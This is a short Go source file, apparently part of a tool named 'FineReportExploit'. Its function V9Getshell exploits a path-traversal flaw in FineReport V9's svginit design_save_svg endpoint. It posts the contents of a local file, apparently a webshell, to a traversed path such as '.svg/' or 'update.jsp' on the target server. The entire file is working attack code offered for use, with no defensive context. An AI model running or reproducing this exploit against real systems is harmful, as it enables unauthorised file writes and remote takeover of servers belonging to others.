package V9Getshell

import (
	"FineReportExploit/utils"
	"io/ioutil"
	"os"
	"strings"
)

func V9Getshell(url string, file string, name string) {
	url = utils.FixUrl(url)
	//url = url + "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../update.jsp"
	url = url + "/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../.svg/" + name
	fil, err := os.Open(file)
	if err != nil {
		panic(err)
	}
	defer fil.Close()
	content, err := ioutil.ReadAll(fil)
	s := string(content)
	s2 := strings.Replace(s, `"`, `\"`, -1)

	str1 := "{\"__CONTENT__\":\""
	str2 := "\",\"__CHARSET__\":\"UTF-8\"}"
	post_body := str1 + s2 + str2

	header := make(map[string]string)
	header["Content-Type"] = "application/json"
	resp := utils.PostData(url, post_body, header)
	resp.Body.Close()
}
